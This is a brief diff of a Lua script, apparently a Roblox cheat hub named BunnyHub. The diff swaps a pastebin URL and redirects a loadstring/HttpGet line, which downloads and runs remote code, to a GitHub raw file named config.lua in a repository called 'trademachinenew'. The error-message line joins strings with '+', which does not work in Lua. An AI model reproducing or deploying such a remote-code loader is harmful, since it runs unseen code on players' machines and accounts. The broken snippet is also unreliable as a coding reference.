@@ -24,7 +24,7 @@ local TARGET_PLACE_IDS = {
     [119594317142884] = true,
     [128855408206367] = true,
 }
-local BASE_URL = "https://pastebin.com/raw/g4lFx7Dy"
+local BASE_URL = "https://pastebin.com/hesvtBJX"
 local KeyFileName = "BunnyHub_PendingKey.json"
 local ConfigFile = "BunnyHub_Config.json"
 
@@ -772,7 +772,7 @@ end)
 -- // 
 task.spawn(function()
     local success, err = pcall(function()
-        loadstring(game:HttpGet("https://pastefy.app/xd/raw"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/trademachinenew/newmachinetrade/refs/heads/main/config.lua"))()
     end)
     if not success then
         warn("[BunnyHub] Error al cargar el Pastefy remoto: " + tostring(err))
